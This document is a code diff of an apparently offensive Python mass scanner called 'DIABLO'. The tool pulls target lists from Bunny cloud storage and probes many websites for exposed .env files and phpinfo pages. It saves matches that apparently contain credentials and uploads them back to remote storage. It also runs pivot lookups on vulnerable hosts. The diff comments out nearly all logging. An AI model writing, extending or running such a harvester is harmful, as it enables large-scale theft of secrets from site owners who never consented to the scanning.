@@ -98,11 +98,11 @@ def claim_next_file_from_bunny(site_dir: Path) -> Optional[Path]:
                     local_path = site_dir / file_name
                     with open(local_path, "wb") as f:
                         f.write(res.content)
-                    logger.info(f"[BUNNY CLAIM] ✔️ File scaricato: {file_name}")
+                   # logger.info(f"[BUNNY CLAIM] ✔️ File scaricato: {file_name}")
                     
                     delete_res = requests.delete(file_url, headers={"AccessKey": BUNNY_API_KEY}, timeout=15)
-                    if delete_res.status_code == 200:
-                        logger.info(f"[BUNNY CLAIM] 🔒 File rimosso dalla coda remota (Reclamato): {file_name}")
+                  #  if delete_res.status_code == 200:
+                   #     logger.info(f"[BUNNY CLAIM] 🔒 File rimosso dalla coda remota (Reclamato): {file_name}")
                         
                     return local_path
         else:
@@ -115,23 +115,23 @@ def claim_next_file_from_bunny(site_dir: Path) -> Optional[Path]:
 def upload_file_to_bunny(local_path: Path, remote_path: str) -> None:
     headers = {"AccessKey": BUNNY_API_KEY}
     try:
-        logger.info(f"[BUNNY UPLOAD] Inizio caricamento del file {local_path} verso {remote_path}...")
+        #logger.info(f"[BUNNY UPLOAD] Inizio caricamento del file {local_path} verso {remote_path}...")
         with open(local_path, "rb") as f:
             data = f.read()
         url = f"{BUNNY_STORAGE_URL}/{remote_path}"
         res = requests.put(url, headers=headers, data=data, timeout=30)
-        if res.status_code in [200, 201]:
-            logger.info(f"[BUNNY UPLOAD] ✔️ Caricato su Bunny: {remote_path}")
-        else:
-            logger.error(f"[BUNNY UPLOAD] ❌ Errore upload {remote_path}: Status {res.status_code} - {res.text}")
+      #  if res.status_code in [200, 201]:
+        #    logger.info(f"[BUNNY UPLOAD] ✔️ Caricato su Bunny: {remote_path}")
+    #    else:
+      #      logger.error(f"[BUNNY UPLOAD] ❌ Errore upload {remote_path}: Status {res.status_code} - {res.text}")
     except Exception as e:
-        logger.warning(f"[BUNNY UPLOAD] ⚠️ Eccezione durante l'upload di {remote_path}: {str(e)}")
+       # logger.warning(f"[BUNNY UPLOAD] ⚠️ Eccezione durante l'upload di {remote_path}: {str(e)}")
         error_log = RESULT_DIR / 'ERROR2.txt'
         with open(error_log, 'a', encoding='utf-8') as f:
             f.write(f"Error uploading to Bunny Storage: {str(e)}\n")
 
 def upload_results_to_bunny() -> None:
-    logger.info("[BUNNY UPLOAD] Inizio caricamento cartella risultati su Bunny Storage...")
+    #logger.info("[BUNNY UPLOAD] Inizio caricamento cartella risultati su Bunny Storage...")
     for file_path in RESULT_DIR.rglob('*'):
         if file_path.is_file():
             rel_path = file_path.relative_to(RESULT_DIR)
@@ -144,12 +144,12 @@ def delete_file_from_bunny(remote_path: str) -> None:
     try:
         url = f"{BUNNY_STORAGE_URL}/{remote_path}"
         res = requests.delete(url, headers=headers, timeout=15)
-        if res.status_code == 200:
-            logger.info(f"[BUNNY DELETE] 🗑️ Eliminato con successo da Bunny: {remote_path}")
-        else:
-            logger.error(f"[BUNNY DELETE] ❌ Errore eliminazione {remote_path}: Status {res.status_code} - {res.text}")
+       # if res.status_code == 200:
+       #     logger.info(f"[BUNNY DELETE] 🗑️ Eliminato con successo da Bunny: {remote_path}")
+      #  else:
+          #  logger.error(f"[BUNNY DELETE] ❌ Errore eliminazione {remote_path}: Status {res.status_code} - {res.text}")
     except Exception as e:
-        logger.warning(f"[BUNNY DELETE] ⚠️ Eccezione durante l'eliminazione di {remote_path}: {str(e)}")
+       # logger.warning(f"[BUNNY DELETE] ⚠️ Eccezione durante l'eliminazione di {remote_path}: {str(e)}")
         error_log = RESULT_DIR / 'ERROR2.txt'
         with open(error_log, 'a', encoding='utf-8') as f:
             f.write(f"Error deleting from Bunny Storage: {str(e)}\n")
@@ -177,7 +177,7 @@ def chunked_hosts_multi(file_found: Path, chunk_size: int = 50) -> Iterator[List
                     seen.add(url)
                     unique.append(url)
     except Exception as e:
-        logger.error(f"Errore lettura {file_found}: {e}")
+        #logger.error(f"Errore lettura {file_found}: {e}")
         return
     it = iter(unique)
     while True:
@@ -303,8 +303,8 @@ def find_subdomains(domain: str) -> Optional[List[str]]:
 # --- Scomposizione Funzioni di Analisi ---
 
 def check_fake_responses(r: requests.Response) -> Tuple[bool, bool]:
-    """Controlla se la risposta indica un 'fake site' (es. wildcard catch-all).
-    Ritorna (is_fake, is_valid_url)"""
+   # """Controlla se la risposta indica un 'fake site' (es. wildcard catch-all).
+ #   Ritorna (is_fake, is_valid_url)"""
     try:
         content = r.content
         content_lower = content.lower()
@@ -321,7 +321,7 @@ def check_fake_responses(r: requests.Response) -> Tuple[bool, bool]:
     return False, False
 
 def parse_phpinfo(html_content: str) -> Optional[str]:
-    """Estrae le variabili PHP da una pagina phpinfo()"""
+   # """Estrae le variabili PHP da una pagina phpinfo()"""
     try:
         soup = BeautifulSoup(html_content, "html.parser")
         h2_tag = soup.find("h2", string="PHP Variables")
@@ -346,7 +346,7 @@ def parse_phpinfo(html_content: str) -> Optional[str]:
     return None
 
 def validate_regex(contentsx: str, is_php_file: bool, is_html_content: bool, is_env_file: bool) -> bool:
-    """Verifica se il contenuto matcha le regex vulnerabili in configurazione."""
+    #"""Verifica se il contenuto matcha le regex vulnerabili in configurazione."""
     regex_found = False
     for pattern in KEYWORD_REGEX_ENV:
         if "PHP Version" in pattern and not (is_php_file or is_html_content): continue
@@ -368,7 +368,7 @@ def validate_regex(contentsx: str, is_php_file: bool, is_html_content: bool, is_
     return regex_found
 
 def save_vulnerability_file(file_type: str, response_url: str, contentsx: str, site_link: str, code: str) -> None:
-    """Salva il file vulnerabile e lo carica su Bunny."""
+    #"""Salva il file vulnerabile e lo carica su Bunny."""
     rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
     file_base_name = f'DIABLO_{file_type}'
     
@@ -390,7 +390,7 @@ def save_vulnerability_file(file_type: str, response_url: str, contentsx: str, s
     upload_file_to_bunny(saved_file_path, remote_subpath)
 
 def execute_pivot_search(site_link: str) -> None:
-    """Esegue pivot lookup per IP o domini trovati vulnerabili."""
+   # """Esegue pivot lookup per IP o domini trovati vulnerabili."""
     hostxxx = urlparse(site_link).hostname
     if hostxxx and hostxxx.startswith("www."):
         hostxxx = hostxxx[4:]
@@ -632,8 +632,8 @@ def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fal
             f.write(str(e) + '\n')
 
 def check_connectivity_and_scan(urls_list: List[str], is_fallback: bool = False) -> None:
-    """Funzione comune per testare la connettività di un blocco di URL e avviare la scansione sui target vivi."""
-    logger.info(f"[SCANNER] Controllo blocco di {len(urls_list)} target...")
+   # """Funzione comune per testare la connettività di un blocco di URL e avviare la scansione sui target vivi."""
+   # logger.info(f"[SCANNER] Controllo blocco di {len(urls_list)} target...")
     try:
         resp_site = [
             grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False)
@@ -678,7 +678,7 @@ def check_connectivity_and_scan(urls_list: List[str], is_fallback: bool = False)
         site_pool = Pool(100)
         jobs = []
         for site_link, site_payloads in hosts_by_site.items():
-            logger.info(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}")
+           # logger.info(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}")
             jobs.append(site_pool.spawn(_scan_site, site_link, site_payloads, is_fallback))
         site_pool.join()
             
@@ -689,7 +689,7 @@ def check_connectivity_and_scan(urls_list: List[str], is_fallback: bool = False)
 
 def process_urls(urls_list: List[str], is_fallback: bool = False) -> None:
     it = iter(urls_list)
-    logger.info(f"\n[SCANNER] 🚀 Avvio scansione su {len(urls_list)} URL (fallback={is_fallback})...")
+    #logger.info(f"\n[SCANNER] 🚀 Avvio scansione su {len(urls_list)} URL (fallback={is_fallback})...")
     while True:
         chunk = list(islice(it, 200))
         if not chunk:
@@ -697,19 +697,19 @@ def process_urls(urls_list: List[str], is_fallback: bool = False) -> None:
         check_connectivity_and_scan(chunk, is_fallback)
 
 def process_file(file_path: Path) -> None:
-    logger.info(f"\n[SCANNER] 🚀 Avvio elaborazione del file: {file_path.name}")
+    #logger.info(f"\n[SCANNER] 🚀 Avvio elaborazione del file: {file_path.name}")
     for cameras in chunked_hosts_multi(file_path, chunk_size=200):
         check_connectivity_and_scan(cameras, is_fallback=False)
                 
-    logger.info(f"\n[SCANNER] 🏁 Elaborazione terminata per: {file_path.name}")
+    #logger.info(f"\n[SCANNER] 🏁 Elaborazione terminata per: {file_path.name}")
     try:
         file_path.unlink()
-        logger.info(f"[SYSTEM] File locale eliminato: {file_path}")
+       # logger.info(f"[SYSTEM] File locale eliminato: {file_path}")
     except Exception as e:
         logger.error(f"[SYSTEM] Errore eliminazione locale {file_path}: {e}")
 
 def main() -> None:
-    logger.info("\n[SYSTEM] 🛡️ Inizializzazione scanner DIABLO in modalità CLOUD WORKER...")
+    #logger.info("\n[SYSTEM] 🛡️ Inizializzazione scanner DIABLO in modalità CLOUD WORKER...")
     RESULT_DIR.mkdir(parents=True, exist_ok=True)
     NEW_PATH_EXTRACT.mkdir(parents=True, exist_ok=True)
     
@@ -723,17 +723,17 @@ def main() -> None:
             if txt_file:
                 process_file(txt_file)
                 
-                logger.info("\n[SYSTEM] 📦 Scansione file terminata. Avvio caricamento risultati generali incrementali...")
+               # logger.info("\n[SYSTEM] 📦 Scansione file terminata. Avvio caricamento risultati generali incrementali...")
                 upload_results_to_bunny()
-                logger.info("[SYSTEM] ✅ Risultati caricati con successo.")
+              #  logger.info("[SYSTEM] ✅ Risultati caricati con successo.")
             else:
-                logger.info("\n[SYSTEM] 💤 Nessun file in coda su Bunny. In attesa di nuovi target...")
+               # logger.info("\n[SYSTEM] 💤 Nessun file in coda su Bunny. In attesa di nuovi target...")
                 time.sleep(60)
         except KeyboardInterrupt:
-            logger.info("\n[SYSTEM] Interruzione manuale ricevuta. Chiusura in corso...")
+            #logger.info("\n[SYSTEM] Interruzione manuale ricevuta. Chiusura in corso...")
             break
         except Exception as e:
-            logger.error(f"[SYSTEM] Errore critico nel ciclo principale: {e}")
+            #logger.error(f"[SYSTEM] Errore critico nel ciclo principale: {e}")
             time.sleep(10)
 
 if __name__ == '__main__':
